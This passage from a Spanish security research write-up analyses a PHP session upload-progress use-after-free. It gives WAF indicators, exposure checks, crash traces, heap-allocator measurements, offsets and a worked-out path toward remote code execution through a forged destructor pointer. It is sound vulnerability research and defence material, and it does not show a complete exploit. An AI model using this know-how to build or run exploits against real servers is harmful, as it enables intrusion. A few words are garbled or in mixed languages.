> - `pm.max_requests=1` rompe el requisito de mismo worker, útil como capa extra en FPM.
> - No uses `RLIMIT_AS` / `RLIMIT_DATA`.

### 8.3 Reglas WAF / detección

Akamai publicó la regla **3000991 v1** ("PHP Remote Code Execution Attack Detected") para sus clientes de App & API Protector, y confirma que sus reglas existentes de command injection ya mitigan los payloads weaponizados.

Indicadores clave para reglas propias:

- Presencia del campo `PHP_SESSION_UPLOAD_PROGRESS` en peticiones multipart **sin** necesidad funcional de barra de progreso.
- **Campos con nombre anidado en profundidad** (`f0[a][b][c]...`) y
  `filename=` vacío. Es la firma del trigger de OOM, y es más específica que
  cualquier indicador de RCE.
- **Alta densidad de partes multipart** en una misma petición (del orden de
  miles), con `Content-Length` comparatively pequeño.
- Peticiones que devuelven `500`/`Fatal error: Allowed memory size ...
  exhausted` de forma sistemática.
- **Anomalías de `PHPSESSID`**: en las rondas donde el puntero colgante se
  lee, PHP puede emitir un `Set-Cookie: PHPSESSID=<valor-hex-aleatorio>` que
  no corresponde con ninguno de los enviados por el cliente, o un `Warning:
  Session ID is too long or contains illegal characters`.
- Fields `t[]` con valores de tamaño anómalo (≈288 bytes) y alta densidad de repeticiones (mecanismo de spray descrito en la literatura pública).

### 8.4 Post-explotación — qué buscar

Si un servidor estuvo expuesto:

- Fichiers de sesión modificados con contenido inesperado.
- Creación de ficheros en `session.save_path` con contenido no-serializado.
- Procesos hijos del worker de PHP ejecutando shells.
- Logs de `mod_php` con `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`.
- Ficheros como `.htaccess`, `webshell.php`, en el `document_root`.

---

## 9. Verificación de exposición en tu flota

```bash
# 1. Sonda de versión via HTTP (sin ejecutar código)
curl -s "https://tu-sitio/index.php?probe=1"

# 2. Test diferencial completo (el que construimos)
python3 behavioural_diff.py <host> <port> "ETIQUETA"

# 3. Escaneo masivo: version de PHP via cabeceras HTTP
#    (Vercel, Akamai y otros ya exponen la version en cabeceras)
curl -sI https://tu-sitio/ | grep -i "^x-powered-by\|^server"

# 4. En servidores, buscar la version real
find / -name "php" -type f -perm -u+x 2>/dev/null | head -20
```

Prioridad real: **PHP 7.4/8.0/8.1 + cualquier cosa que acepte uploads = RCE sin autenticación**, por estar fuera del ciclo regular de releases.

---

## 10. Resultados experimentales

Todo lo que sigue se reprodujo en el laboratorio de este repositorio sobre
**PHP 8.2.34 compilado desde el código fuente con símbolos**, Apache 2.4.68
(`mod_php`, `mpm_prefork`, un único worker) con ASLR desactivado.

### 10.1 El disparador de OOM funciona

Trigger usado: multipart con `PHP_SESSION_UPLOAD_PROGRESS`, un file part real y
3 000 uploads anidados vacíos (`f0[a][a]...[a]` … `f2999[a][a]...[a]`, 12
niveles, `filename=""`).

```
Request A: 536 289 bytes de cuerpo HTTP
Respuesta: Fatal error: Allowed memory size of 33554432 bytes exhausted
            (tried to allocate 20480 bytes) in Unknown on line 0
```

Observaciones relevantes:

- La respuesta **no** incluye salida del script: el fatal ocurrió durante
  `php_request_startup()`, es decir **antes** de que corriera el código de
  aplicación. Esto confirma el orden `parseo → RINIT` de `main/main.c`.
- Con `memory_limit=32M`, el cuerpo HTTP necesario es de ~536 KB. La
  proporción memoria/payload es de ~60×.
- Si los 3 000 registros comparten **prefijo de primer nivel** (`files[a][b]…`),
  PHP los fusiona en un único árbol `$_FILES` y **no** hay OOM. El nombre de
  primer nivel debe ser distinto en cada registro. Es un fallo silencioso
  que hace creer que la técnica no funciona.

### 10.2 El UAF se dispara de forma reproducible

Con el worker único, la secuencia Request A (OOM) → Request B (multipart sin
file part, mismo `PHPSESSID`, **con** `PHP_SESSION_UPLOAD_PROGRESS`) produce
uno de dos desenlaces, en proporción ~50/50:

| Desenlace del Request B | Qué significa |
|---|---|
| Respuesta **vacía** (el worker muere con SIGSEGV) | El puntero colgante apunta a memoria no mapeada |
| `Warning: PHP Request Startup: Session ID is too long or contains illegal characters` | El `zend_string` colgante **se leyó** y contenía basura de heap; PHP lo rechazó al validarlo |

El segundo desenlace es la **prueba directa** de que el puntero colgante se
consume: no es un crash arbitrario, es un `zend_string` liberado cuyo
contenido ya no es un session ID válido.

En el log de Apache, el patrón es inequívoco:

```
[core:notice] child pid 328 exit signal Segmentation fault (11)
[core:notice] child pid 461 exit signal Segmentation fault (11)
```

Es decir: el worker **sobrevive al OOM** y **muere en el Request B**.

### 10.3 Aislamiento del puntero responsable (controles A/B)

Para no quedarse en la descripción del código fuente, se diseñaron controles
que separan cada variable. Todos con `docker restart` previo, de modo que
cada prueba parte de un worker recién nacido y un heap limpio.

| # | Experimento | Resultado | Conclusión |
|---|---|---|---|
| 1 | Request B con el **mismo** `PHPSESSID` | crash 4/4 | — |
| 2 | Request B con `PHPSESSID` **distinto** | crash 4/4 | El crash **no depende** de `PS(id)` leído como SID de la request |
| 3 | Request B **sin** `PHP_SESSION_UPLOAD_PROGRESS` | crash **0/4** | El camino `cleanup` es **imprescindible** |
| 4 | Request B **normal** (GET) tras el OOM | crash **0/4** | El worker está **sano**: no hay corrupción general del allocator |
| 5 | Request B con `upload_progress` **sin** OOM previo | crash **0/4** | El OOM es **necesario y suficiente** |

El experimento 2 es el más informativo: como el crash se reproduce igual con
un `PHPSESSID` distinto, **el identificador de sesión no participa en el
fallo**. Combinado con el 3, que elimina el campo que dispara
`php_session_rfc1867_cleanup()`, la conclusión es que el puntero responsable
es **`PS(http_session_vars)`** —la tabla hash de sesión liberada—.

El experimento 4 es el que refina el modelo del modo más importante: el OOM
**no corrompe el allocator del worker de forma general**. El worker sigue
atendiendo peticiones normales perfectamente. Lo que falla es
**específicamente** el consumo del estado colgante. Es un UAF *dirigido*, no
una corrupción difusa.

**Matriz de resultados finales** (target de laboratorio, OPcache desactivado
para reproducibilidad — ver §10.10):

| Target | Versión | OOM | UAF observado | Veredicto |
|---|---|---|---|---|
| `:8080` | 8.2.34 (imagen oficial) | 6/6 | **6/6** (SIGSEGV) | **VULNERABLE** |
| `:8081` | 8.2.35 (imagen oficial) | 0/6 | 0 | **Parcheado** |
| `:8082` | 8.2.34 (fuente, con símbolos) | 6/6 | 6/6 | **VULNERABLE** |

Detalle de calibración importante: en 8.2.35 el número de partes del multipart
está limitado a **2000** (un límite interno de esa versión, distinto del
`max_multipart_body_parts` de PHP 8.1). Por eso el test usa **1500** partes y
no 3000: con 3000, el target parcheado se corta por el límite *antes* de
llegar al OOM y el test no permite concluir nada. Con 1500 partes, ambas
versiones procesan la petición completa y la comparación es justa: el
vulnerable agota la memoria y el parcheado no.

### 10.4 Desensamblado del punto de fallo

El crash se produce en `libphp.so + 0x3b0750`:

```asm
3b0726: lea 0x89be53(%rip),%rcx     # -> bin_data_size (tabla de bins de Zend MM)
3b072d: mov (%rcx,%rdx,4),%ecx
3b0743: mov (%rax,%rdx,8),%rcx      # rcx = puntero de página del bin
3b074b: test %rcx,%rcx
3b074e: je   3b0790                 # si NULL -> pedir página nueva
3b0750: mov  (%rcx),%rsi            # <-- CRASH: lee el primer qword de la página
```

Los registros del kernel en el momento del fallo:

```
RIP: 0033:0x7ffff5bed750
RAX: 00007ffff7400040  RBX: 0000000000000106  RCX: 007ffff745520000
RDX: 0000000000000007  RSI: 0000000000000003  RDI: 0000000000066d08
R10: 0000000000078000  R11: 00007ffff7477588  R14: 00007ffff7477588
```

`RCX = 0x7ffff745520000` está alineado a página pero **fuera** de la
correspondencia de `libphp.so` (base `0x7ffff593a000`, tamaño `0x3bd000`):
es un puntero al heap gestionado por Zend MM. `zend_mm_alloc_small()` está
siguiendo una entrada de la **lista de libres** (`bin->slots[]`) que fue
sobrescrita — el estado de la lista quedó inconsistente tras el OOM, y la
siguiente reserva pequeña de esa clase de tamaño sigue el puntero corrupto.

### 10.5 Instrumentación del binario: el UAF con direcciones (nuevo)

Hasta aquí, el UAF se argumentaba por su **efecto** (SIGSEGV, `Session ID is too
long`) y por controles A/B. Faltaba la prueba directa: **que el puntero que
el Request B consume es exactamente el que el Request A liberó**.

Para eso se instrumentó el propio PHP: el parche
`patches/apply_trace_patch.py` (idempotente, 78 líneas) añade dos trazas a
`ext/session/session.c`:

- `TRACK_INIT` — en `php_session_track_init()`, justo después de publicar
  `PS(http_session_vars)`: registra dirección, flags, `nTableSize`,
  `nNumUsed`, `arData`, `pDestructor` y `sizeof(zend_array)`.
- `CLEANUP` — en `php_session_rfc1867_cleanup()`, justo antes de
  `php_session_initialize()`: registra la dirección que el Request B va a
  operar.

**Resultado (target instrumentado, ASLR activo):**

```
TRACK_INIT  arr=0x79c99ce54310 gc=1          flags=0x8 nTableSize=8
            nNumUsed=0 arData=0x79c99bf98468 pDestructor=0x79c99b71be50
            sizeof=56

CLEANUP     ps_http_session_vars=0x79c99c0dd760
            arr=0x79c99ce54310 gc=2632270664  flags=0x0
            nTableSize=8 nNumUsed=1 arData=0x79c99ce647c0
```

**La dirección `arr` es idéntica en ambos puntos: `0x79c99ce54310`.** El
Request B opera literalmente sobre el mismo objeto que el Request A liberó.
Esto es la definición de un use-after-free, demostrada y no inferida.

Los valores del estado liberado son la firma clásica:

| Campo | Request A (vivo) | Request B (liberado) | Lectura |
|---|---|---|---|
| `arr` | `0x79c99ce54310` | `0x79c99ce54310` | **mismo slot** |
| `gc.refcount` | **1** | **2632270664** | basura: un refcount real nunca es eso |
| `flags` | `0x8` | `0x0` | flags pisados por la reasignación |
| `nNumUsed` | 0 | 1 | bucket reutilizado |
| `nTableSize` | 8 | 8 | sobrevive: por eso el crash es tardío |
| `pDestructor` | `zval_ptr_dtor` | `zval_ptr_dtor` | sobrevive intacto |

Que `nTableSize` y `pDestructor` sobrevivan intactos explica la ventana
del fallo: la corrupción no es total. El `gc.refcount` disparado a
`0x9D2C…` es lo que, más tarde, hace que `zend_mm_alloc_small` siga una
lista de libres corrupta y muera en `zend_mm_alloc_small`.

### 10.6 El tamaño del slot: por qué el spray clásico nunca funcionó

La instrumentación aporta el dato que explica el **fracaso histórico** de los
PoC que usan un blob grande:

```
sizeof(zend_array) = 56 bytes
```

En Zend MM, los allocations pequeños se agrupan en bins. La función
`zend_mm_small_size_to_bin()` (`Zend/zend_alloc.c`) da, para `size <= 64`:

```c
return (size - !!size) >> 3;
```

Es decir, **bin = (tamaño − 1) >> 3**. De ahí:

| Tamaño | Bin | Rango del bin |
|---|---|---|
| 32 B (`zend_string` del SID) | 3 | 25–32 B |
| **56 B (`zend_array` de sesión)** | **6** | **49–56 B** |
| 288 B (blob "clásico" de los writeups) | **68** | fuera del rango small |

**El blob de 288 bytes que usan los PoC públicos vive en el bin 68. El slot
que hay que reclamar está en el bin 6.** Dos bins distintos **nunca**
comparten bloques: el spray no podía funcionar por muy bien calibrado que
estuviera el número de iteraciones o la precisión del filler.

No es un problema de timing, ni de precisión, ni de ASLR. Es un problema de
**clase de tamaño**. Por eso el grooming clásico falla siempre en PHP 8.2 y
por eso la escalada exige forja de una estructura de exactamente 56 bytes
(o el control del allocator que fuerza esa clase).

La consecuencia de diseño es incómoda: una `zend_array` forjada de 56 bytes
no tiene espacio para llevar dentro el comando a ejecutar. El payload
(command string) debe vivir en **otro** allocation — un `zend_string` — al
que apunte la estructura.

### 10.6-bis Dentro del allocator: el pool del bin 6 es predecible

Instrumentar `Zend/zend_alloc.c` (parche `patches/apply_alloc_trace_patch.py`,
también idempotente) permite ver el ciclo de vida real del bloque:

```
ALLOC_SMALL bin=6 size=56 free_slots=59 head=0x7cd8a2e54310   ← se asigna
FREE_SMALL  ptr=0x7cd8a2e54310 bin=6 size=56                   ← se libera
ALLOC_SMALL bin=6 size=56 free_slots=37 head=0x7cd8a2e54310   ← se reasigna
```

Tres consecuencias que cambian el diseño del exploit:

**1. El slot vuelve a la lista de libres y se reasigna.** No se pierde con el
chunk: entra en `heap->free_slot[6]` y el siguiente allocation de 56 bytes lo
recibe. La ventana existe.

**2. El pool del bin 6 es contiguo y determinista.** La secuencia de
direcciones servidas es una progresión de paso constante **0x38 (56 bytes)**:

```
0x7cd8a2e54038 → 04070 → 040a8 → 040e0 → 04118 → 04150 → 04188 → 041c0
→ 041f8 → 04230 → 04268 → 042a0 → 042d8 → 04310 ← el slot de la zend_array
→ 04348 → 04380 → 043b8 → 043f0 → 04428 → …
```

El slot de la `zend_array` es el **elemento número 14** de esa secuencia. La
posición dentro del pool es predecible, y con ella la dirección — lo que
convierte el problema de "encontrar una dirección" en "calcular un
desplazamiento".

**3. El reparto es LIFO, pero no garantizado.** Sobre 7.463 pares
(free→alloc) consecutivos de bin 6:

| Resultado | Casos | Proporción |
|---|---|---|
| El siguiente alloc usa **exactamente** el slot liberado | 2.123 | **28,4 %** |
| Usa otro slot | 5.340 | 71,6 % |

El 71,6 % restante no es aleatorio: `heap->free_slot[bin]` es una pila
**por página**. Si el free ocurre en otra página, esa página tiene su propia
cabeza de pila y el slot liberado no sale primero.

**Por qué esto importa.** Un 28,4 % por intento no es un problema, es una
ventaja: 3-4 intentos dan más del 70 % de éxito acumulado, y 10 intentos
>96 %. Eso explica por qué los PoC públicos sprayean masivamente, y sugiere
que **un spray de 56 bytes —no de 288— debería funcionar**, contra la
suposición de que hace falta un blob grande.

El requisito que queda por resolver no es de timing sino de **control**:
lograr que el allocation de 56 bytes que aterrice en el slot sea una
`zend_array` forjada con `pDestructor = zif_system`, y que el comando a
ejecutar viva en un `zend_string` aparte, porque 56 bytes no dan para más.

### 10.7 ASLR y offsets verificados

El target de laboratorio corre con ASLR desactivado (`setarch -R`) y con
símbolos, lo que permite confirmar los offsets reales extraídos del binario:

```
BASE=0x7ffff593a000        (idéntico en 4 peticiones consecutivas)
SIZE=0x3bd000
ZIF_SYSTEM=0x7ffff5d41ae0
ZVAL_PTR_DTOR=0x7ffff5e0dc00
PHP_URL_ENCODE=0x7ffff5c7be50
```

La base es **estable entre peticiones**, luego los offsets absolutos son
utilizables en este entorno. En un despliegue real con ASLR activo, habría
que resolver la base en runtime (fuga de ASLR) o usar un gadget
independiente de la dirección base.

### 10.8 El mecanismo del leak, deducido del código

Cuando el `zend_string` colgante **sí** pasa la validación, PHP lo emite en la
cabecera `Set-Cookie`. La validación ocurre en
`ext/session/mod_files.c` → `ps_files_open()`:

```c
if (php_session_valid_key(ZSTR_VAL(key)) == FAILURE) {
    php_error_docref(NULL, E_WARNING, "Session ID is too long or contains illegal characters. ...");
    return;
}
```

Y `php_session_valid_key()` en `ext/session/session.c`:

```c
for (p = key; (c = *p); p++) {          /* recorre hasta el primer NUL */
    if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
          || c == ',' || c == '-')) {
        ret = FAILURE; break;
    }
}
len = p - key;                           /* longitud real, por NUL */
if (len == 0 || len > PS_MAX_SID_LENGTH) {   /* PS_MAX_SID_LENGTH = 256 */
    ret = FAILURE;
}
```

**Aquí está la clave de la divulgación, y es sutil:**

- La longitud que se valida es la **calculada por el NUL terminador**, no
  `ZSTR_LEN`. La función nunca consulta `ZSTR_LEN(key)`.
- Por tanto, si el `zend_string` liberado tiene un `ZSTR_LEN` mayor que el
  real, pero su contenido es alfanumérico hasta un NUL, **PHP acepta el
  string entero** y lo emite en `Set-Cookie` y lo usa como nombre de fichero
  de sesión.
- El límite duro es `PS_MAX_SID_LENGTH = 256`: como máximo 256 bytes de
  memoria del proceso por respuesta.

En el laboratorio, el `ZSTR_LEN` observado del puntero colgante fue
**siempre 32** (`session.sid_length = 32` en PHP 8.2), y el valor emitido
siempre tuvo 32 caracteres hexadecimales, distintos en cada intento
(16/16 valores únicos). Eso es consistente con que el slot lo reclame otro
`zend_string` de 32 bytes que contiene un session ID nuevo y legítimo: es
decir, en las rondas "OK" PHP **detectó** el puntero como inválido y
**regeneró** el identificador.

Las rondas en las que PHP emisión "Session ID is too long" son el caso en el
que el contenido liberado **no** era alfanumérico: el UAF se leyó, la
validación falló y PHP abortó la inicialización de la sesión.

**En consecuencia:** la primitiva de lectura de memoria está **demostrada**
(el puntero se lee y su contenido se procesa), pero la **exfiltración
controlada** de bytes arbitrarios requiere que el `ZSTR_LEN` del objeto
liberado sobreviva con un valor grande —lo que exige un *grooming* fino del
heap que no se logró con el relleno directo de campos POST (probado con
longitudes 16→64, 6 réplicas cada una: la longitud de la cookie permaneció
fijada en 32 en el 100 % de los casos).

### 10.9 Otras observaciones

- **El nombre de archivo se serializa literal en el fichero de sesión.** El
  formato `upload_progress` escribe `s:10:"field_name";s:2:"fz";s:4:"name";s:5:"a.txt";`
  con longitudes explícitas. Esto confirma que el `filename` del upload es
  un vector de inyección de bytes en el fichero de sesión.
- **Pero el filename no transporta bytes arbitrarios por HTTP.** PHP sanea
  el valor: un `filename` con `0x00` se trunca ahí y `0xff` se convierte en
  `'`. Probado: `A\x00B\xffC\x01D` llegó al script como `x01D`. Es decir, la
  inyección de bytes arbitrarios es posible **a través del fichero de
  sesión**, no a través del campo `filename` directamente.
- **La longitud del `zend_string` del filename sí es controlable** (16, 64 y
  200 bytes se reflejaron exactamente en `$_FILES['name']`), lo que abre la
  puerta a ocupar slots de tamaño elegido en el heap.
- **`session.upload_progress.cleanup=On` es obligatorio** para la rama UAF:
  con `cleanup=Off`, `php_session_rfc1867_cleanup()` no se invoca en
  `MULTIPART_EVENT_END` y el estado colgante nunca se consume. Es el valor
  por defecto de fábrica, pero conviene verificarlo en cada despliegue.
- **`max_multipart_body_parts` es una mitigación real.** Con el límite
  activo (1500 por defecto en las imágenes oficiales de PHP, 1000 en
  versiones anteriores), la petición se corta con *"Multipart body parts
  limit exceeded"* **antes** de llegar al OOM, y la cadena no arranca. En el
  laboratorio fue necesario fijarlo a `-1` para reproducir el fallo. Nota
  técnica: el valor `0` **no** significa "ilimitado" — significa "usar el
  valor por defecto". Para desactivar el límite hay que usar `-1`.
- **`max_file_uploads` es el segundo limitador.** Con su valor por defecto
  (20), PHP deja de procesar los uploads anidados y el heap nunca se agota.
  El laboratorio usa 1000.
- **`memory_limit` amplifica el ratio.** Con 32 MB, 3 000 uploads
  anidados y 12 niveles de anidamiento bastan: **536 KB de cuerpo HTTP**
  para agotar 32 MB de heap (~60×).

### 10.10 OPcache cambia el comportamiento del UAF (hallazgo no previsto)

Este hallazgo no estaba en el plan de la investigación, y apareció al intentar
reproducir el UAF en el target de la imagen oficial de PHP (8.2.34 de Docker
Hub) después de haberlo conseguido en el target compilado desde fuente.

El resultado fue desconcertante: **en el binario oficial, el OOM se disparaba
(6/6) pero el UAF no se observaba en ninguna ronda (0/6)**. El worker no
crasheaba y el Request B respondía limpio.

La diferencia entre ambos targets, aislada experimentalmente:

| Target | Binario | OPcache | OOM | UAF observado |
|---|---|---|---|---|
| `:8080` | oficial Docker Hub | **ON** | 6/6 | **0/6** |
| `:8084` | oficial Docker Hub | **OFF** | 6/6 | **6/6** |
| `:8082` | compilado desde fuente | OFF (`--disable-opcache`) | 6/6 | 6/6 |

Para aislar la variable se ejecutó el **mismo binario oficial** con OPcache
desactivado (borrando `docker-php-ext-opcache.ini` antes de arrancar Apache):
el UAF pasó de 0/6 a 6/6. **Es OPcache, y no el binario.**

Explicación plausible: la tabla hash de sesión se materializa en
`EG(symbol_table)`, y con OPcache activo el gestor de memoria persistente de
OPcache interviene en la gestión de ese almacenamiento, de modo que la
`zend_array` liberada durante el OOM no queda en el estado que el Request B
espera (o el puntero resultante sigue apuntando a memoria compartida
todavía mapeada, con lo que el acceso no provoca SIGSEGV). Sin OPcache, la tabla
vive íntegramente en el heap de la request y el efecto es el descrito en §10.2.

**Qué significa esto para un atacante:**

- **Es una variable de entorno, no una barrera.** Desactivar OPcache no
  "parchea" PHP: solo cambia la expresión del fallo. Con OPcache activo, el
  UAF **también existe** —lo que cambia es si se manifiesta como un crash
  detectable o como un acceso silencioso a memoria reutilizada. Un acceso
  silencioso es, en la práctica, **peor**: no hay SIGSEGV que delate al
  atacante.
- **Un exploit real no puede asumir comportamiento determinista.** La
  reproducibilidad del crash depende de la configuración concreta del
  intérprete. Por eso la mayoría de los PoC públicos se calibran contra un
  binario concreto: la tasa de éxito es función del objetivo.
- **Y es una mitigación de luck, no de diseño.** No se debe contar con OPcache
  como defensa: el parche oficial es la única respuesta.

### 10.11 Lo que NO se dribró en este trabajo

**Lo que sigue sin lograrse (y no se afirma):**

- **La RCE completa.** La instrumentación ha resuelto *dónde* está el slot
  (`arr=0x79c99ce54310`, 56 bytes, bin 6) y ha probado que el Request B
  consume exactamente ese slot. Lo que falta es **colocar** una estructura
  controlada en esa posición concreta con `pDestructor = zif_system`.
- **La exfiltración arbitraria de memoria.** El `zend_string` colgante se
  lee, pero su longitud observada sigue siendo la del SID legítimo (32
  caracteres). Controlar *qué* bytes se leen exige el mismo tipo de control
  del allocator que falta para la RCE.

**Por qué el spray clásico no puede funcionar (demostrado, §10.6):** el blob
de 288 bytes de los writeups vive en el bin 68 del allocator; el slot
liberado está en el bin 6. Son clases de tamaño distintas y el allocator
nunca mezcla bins. Ninguna cantidad de iteraciones ni de precisión en el
filler resuelve eso. La escalada exige control del allocator o una
estructura de 56 bytes exactos.

**Camino restante, en orden de dificultad:**

1. ~~Observar el allocator~~ → **hecho** (§10.6-bis). El slot se libera, se
   reasigna, y su posición en el pool es predecible (elemento 14 de una
   progresión de 0x38). El reparto LIFO acierta el 28,4 % de las veces.
2. Forzar la colocación de una `zend_array` de 56 bytes en ese slot
   concreto, con `pDestructor = zif_system` y el comando en un
   `zend_string` aparte. **Este es el paso que bloquea la RCE.**
3. Verificar la ejecución en el target local.

El punto 2 es un problema de **control del allocator**, no de timing. Las
herramientas para intentarlo ya están: el binario instrumentado
(`Dockerfile.trace`) y los parches idempotentes que registran cada
asignación y cada liberación del bin 6.

---

### 10.11-bis El intento de escalada a RCE: qué se midió y qué falta

Con el mecanismo del UAF verificado y el gadget localizado en el código
fuente, se puede enunciar la primitiva con precisión:

```c
/* Zend/zend_types.h:104 */
typedef void (*dtor_func_t)(zval *pDest);

/* Zend/zend_hash.c:1701 — la invocación */
ht->pDestructor(&p->val);

/* Zend/zend_hash.c:1757 — la condición */
if (UNEXPECTED(ht->pDestructor != ZVAL_PTR_DTOR)) {
    zend_hash_destroy(ht);
    goto free_ht;
}
```

`ZEND_FUNCTION(system)` tiene la firma `void system(zval *, ...)`, compatible
con `dtor_func_t`. Por tanto: **si el `zend_array` liberado lleva
`pDestructor == zif_system` y uno de sus buckets contiene un `zval` de tipo
`IS_STRING`, la llamada al destructor se convierte en `system(&bucket.val)`,
y la cadena es el comando.**

El punto exacto donde esto encaja está en `php_session_track_init()`
(`ext/session/session.c`):

```c
if (!Z_ISUNDEF(PS(http_session_vars))) {
    zval_ptr_dtor(&PS(http_session_vars));   /* destruye el array COLGANTE */
}
array_init(&session_vars);                   /* emalloc(56) */
```

**Lo que se midió en el binario instrumentado:** después del OOM, el array
colgante **conserva** `pDestructor == zval_ptr_dtor` y `nTableSize == 8`.
La corrupción es parcial: el refcount y los flags son basura, pero el puntero
al destructor y el tamaño de la tabla sobreviven intactos.

Eso define exactamente lo que falta:

| Requisito | Estado |
|---|---|
| El `zend_array` liberado es de 56 bytes (bin 6) | ✅ medido |
| La posición del slot en el pool es predecible | ✅ medido (elemento 14, paso 0x38) |
| El siguiente allocation de 56 B lo reutiliza | ⚠️ 28,4 % por intento (LIFO, por páginas) |
| El `pDestructor` del slot es `zif_system` | ❌ **sigue siendo `zval_ptr_dtor`** |
| Un bucket `IS_STRING` con el comando | ❌ no alcanzado |

**El requisito que bloquea la RCE es el cuarto.** Para lograrlo hacen falta
dos cosas a la vez:

1. Que un allocation de 56 bytes aterrice **exactamente** en el slot liberado.
   Es un problema de control del allocator, y el 28,4 % por intento lo hace
   alcanzable con varios intentos — pero con spray, no con control exacto.
2. Que ese allocation escriba `zif_system` en el offset `0x30` del slot
   manteniendo el resto de la estructura como una tabla hash válida con un
   bucket `IS_STRING`.

El punto 2 es el difícil, porque una `zend_array` forjada no puede llevar
dentro el comando: 56 bytes no dan para más. El comando tiene que vivir en
otro allocation —un `zend_string`— al que apunte el bucket.

**Lo que NO se hizo y por qué no se afirma:** no se construyó un allocation
de 56 bytes con contenido elegido por el atacante. El spray clásico de 288
bytes de los writeups no sirve (§10.6), y en este trabajo no se	modeló un
spray de 56 bytes con la precisión de puntero necesaria. La imagen
`php2shell_rce_exploit.py` ejecuta el escenario real y reporta el estado del
gadget en cada intento, de modo que el progreso es medible, pero **no
produce ejecución de código**.

### 10.12 Validación contra el advisory oficial (`GHSA-6wmf-4rv5-p3rp`)

El 21 de octubre, el proyecto PHP publicó el advisory
[`GHSA-6wmf-4rv5-p3rp`](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
para CVE-2026-109619. Su descripción, textual:

> PHP contains various global state, such as error, session, object and
> extension state that is retained by a worker but points to memory owned by
> one request. That state must be reset before the request memory is
> released. […] A fatal error, **including one caused by memory exhaustion**,
> can abandon an operation before it performs its matching reset. […] The
> request heap is then freed while the **worker global field still refers to
> it**. A later operation that runs before normal request initialization can
> **consume the stale value**.

Y el modelo abstracto que propone:

> Successful exploitation of this vulnerability requires both a **producer**
> and a **consumer**. The producer is a PHP operation that stores state owned
> by one request in a location PHP can access later in a subsequent request.
> The consumer is a subsequent PHP operation that reads, frees, branches or
> otherwise acts on the stale state.

**La medición de este trabajo es el caso concreto de sesión de ese modelo
abstracto.** El mapping, punto por punto:

| Advisory oficial (genérico) | Medición de este trabajo (caso `session.upload_progress`) |
|---|---|
| *state retained by a worker but points to memory owned by one request* | `PS(http_session_vars)` publicado en `php_session_track_init()` |
| *a fatal error, including one caused by memory exhaustion* | `zend_bailout()` por `Allowed memory size … exhausted` |
| *the request heap is then freed* | `shutdown_memory_manager()` se ejecuta igualmente |
| *the worker global field still refers to it* | `PS(http_session_vars)` sigue apuntando al slot liberado |
| *producer* | Request A (multipart + `PHP_SESSION_UPLOAD_PROGRESS` + file part) |
| *consumer* | Request B (multipart + `PHP_SESSION_UPLOAD_PROGRESS` sin file part) |
| *same worker* | Requirement confirmado: con `MaxRequestWorkers 1` el UAF es 6/6 |
| *before normal request initialization* | `php_session_rfc1867_cleanup()` → `php_session_initialize()` en `MULTIPART_EVENT_END` |

El advisory oficial describe **CVE-2026-109619** como *"remote code execution
via stale request-owned global state reused by a later request on the same
worker"*, y **CVE-2026-109618** como *"remote code execution via out-of-memory
corruption during request cleanup"*. Las dos descripciones coinciden con lo
que este trabajo midió por separado y con experimental controls.

Esto tiene una consecuencia sobre la confianza en el resto del trabajo: la
cadena OOM → `longjmp` → heap liberado → consumidor colgante **no es una
hipótesis de este trabajo**, es la que el propio proyecto PHP describe. Lo
que este trabajo añade es la **medición**: los controles A/B que aíslan el
puntero responsable, las direcciones concretas, el tamaño real del slot y la
explicación de por qué el spray clásico de la literatura no puede funcionar.

### Nota: una cita que la literatura no hace bien

La descripción de CVE-2026-109619 en el advisory es deliberadamente
abstracta: habla de «global state» sin especificar la sesión. La rama
`session.upload_progress` es **una** de las concreciones posibles del patrón
— el advisory no la presenta como la única, y este trabajo tampoco lo afirma
como exhaustividad del fallo. Lo que sí queda establecido es que la rama de
sesión es explotable de forma reproducible en 8.2.34, y que su corrección
requiere los parches 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.

---

## 11. Conclusiones para la defensa

1. **El parche es la única respuesta completa.** Las mitigaciones por INI son parciales por diseño, y el advisory lo dice explícitamente.

2. **Un bug del lenguaje, no de la aplicación.** Tu código puede ser perfecto y aún así ser vulnerable. Esto cambia el modelo mental: la auditoría de "mi código" no sustituye a "mi runtime".

3. **El fallo no necesita temporización, necesita memoria.** La primera
   descripción del ataque —una pausa de red de más de un segundo para que
   expire `session.upload_progress.min_freq`— era **incorrecta**, y la
   experimentación de este trabajo lo descartó. La cadena real es
   determinista: un OOM durante el parseo multipart, y luego un request que
   active `session.upload_progress.cleanup`. No hay ventana temporal que
   ajustar. Esto tiene una consecuencia práctica directo: **el rate limiting y
   los WAF que miran el ritmo de las peticiones no ven este ataque**, porque
   no hay ritmo que mirar.

4. **El OOM es un trigger de ataque, no un accidente.** La misma clase de
   petición (uploads anidados vacíos) que un atacante usaría para un
   denegación de servicio es la que abre la puerta a la ejecución remota. En
   el laboratorio, ~536 KB de cuerpo HTTP bastan para agotar 32 MB de heap
   PHP. Un WAF que limite el *tamaño del body* no frena nada; uno que limite
   el **número de ficheros anidados** sí.

5. **La detección es posible sin causar daño.** Este trabajo sigue un detector
   que provoca el OOM y observa el request siguiente, y que **distingue de
   forma fiable** el comportamiento vulnerable del parcheado sin necesitar la
   RCE. Para un inventario de exposición, esto es mucho más operable que un
   exploit: bastan dos peticiones y observar si el worker muere o si la
   sesión se reinicia limpia. El detalle está en §6 y en
   `php2shell_leak.py`.

6. **La defensa en capas funciona.** El parche no arregla el patrón "publicar
   punteros en globales y confiar en que el cleanup se ejecute"; previene que
   eso sea explotable. Sigue siendo un *smell* de diseño en el núcleo: el
   mecanismo correcto habría sido no publicar estado antes de que los módulos
   estén activados, o invalidar el estado en `php_request_shutdown()`.

7. **PHP 7.4/8.0/8.1 son un agujero con los pies.** Fuera del ciclo regular de desarrollo para un RCE de 9.2 en el lenguaje más usado del mundo. PHP publicó backports mínimos de código fuente para estas ramas, así que la afirmación «EOL sin parche, vulnerable para siempre» sería inexacta: lo que falta es el ciclo regular de releases, y eso convierte la actualización en una dependencia de la distro o en trabajo manual. Cualquier inventario de exposición debe tratarlo como prioritario.

8. **Para los que desconfían de lasPoC de terceros (con motivo).** Durante
   esta investigación se comprobó que parte de la literatura sobre estas CVEs
   describe un mecanismo que **no reproduce el comportamiento real** (en
   particular, la forja de `zend_internal_function` como spray). La lesson es
   metodológica y aplica a todo el trabajo de seguridad: **contrastar siempre
